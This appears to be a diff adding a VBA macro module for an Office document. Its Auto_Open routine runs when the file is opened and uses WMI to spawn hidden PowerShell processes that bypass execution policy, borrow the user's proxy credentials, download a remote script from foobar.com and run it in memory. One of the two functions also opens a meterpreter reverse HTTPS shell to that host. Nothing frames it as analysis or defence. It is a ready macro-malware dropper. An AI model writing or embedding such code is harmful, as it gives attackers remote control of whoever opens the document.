@@ -1,0 +1,27 @@
+Attribute VB_Name = "Module1"
+Sub Auto_Open()
+    Pop
+    Rocks
+End Sub
+
+Public Function Pop() As Variant
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+    objProcess.Create "powershell -ep bypass -w hidden -nop -c $WC=New-Object System.Net.WebClient;$PA=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer;if($PA){$PA.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$WC.proxy=$PA;$WC.UseDefaultCredentials=$True};$UA=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$WC.Headers.Add('User-Agent', ""$UA"");$WC.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');$WC.Headers.Add('Accept-Language', 'en-US,en;q=0.5');$WC.Headers.Add('Accept-Encoding', 'gzip, deflate');IEX $WC.DownloadString('http://foobar.com/foo/bar');bar -Payload windows/meterpreter/reverse_https -Lhost foobar.com -Lport 443", Null, objConfig, intProcessID
+End Function
+
+Public Function Rocks() As Variant
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+    objProcess.Create "powershell -ep bypass -w hidden -nop -c $WC=New-Object System.Net.WebClient;$PA=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer;if($PA){$PA.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$WC.proxy=$PA;$WC.UseDefaultCredentials=$True};$UA=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$WC.Headers.Add('User-Agent', ""$UA"");$WC.Headers.Add('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');$WC.Headers.Add('Accept-Language', 'en-US,en;q=0.5');$WC.Headers.Add('Accept-Encoding', 'gzip, deflate');IEX $WC.DownloadString('http://foobar.com/foo/bar')", Null, objConfig, intProcessID
+End Function
